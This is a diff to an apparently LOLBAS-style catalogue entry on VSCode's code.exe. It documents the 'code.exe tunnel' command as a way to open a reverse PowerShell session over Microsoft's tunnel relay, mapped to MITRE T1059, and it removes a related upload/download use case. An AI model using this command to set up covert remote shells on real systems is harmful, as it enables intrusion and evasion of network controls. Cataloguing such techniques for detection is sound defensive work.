@@ -4,20 +4,13 @@ Description: VSCode binary, also portable (CLI) version
 Author: PfiatDe
 Created: 2023-02-01
 Commands:
-  - Command: code.exe tunnel [--cli-data-dir ""] [--name ""]
-    Description: Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets
+  - Command: code.exe tunnel --accept-server-license-terms --name "tunnel-name"
+    Description: Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command
     Usecase: Reverse PowerShell session over MS provided infrastructure.
     Category: Execute
     Privileges: User
     MitreID: T1059
-    OperatingSystem: Windows
-  - Command: code.exe tunnel [--cli-data-dir ""] [--name ""]
-    Description: Starts a reverse connection over global.rel.tunnels.api.visualstudio.com via websockets
-    Usecase: Reverse VSCode Session, which allows up- and download
-    Category: Download
-    Privileges: User
-    MitreID: T1105
-    OperatingSystem: Windows
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: '%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe'
   - Path: C:\Program Files\Microsoft VS Code\Code.exe
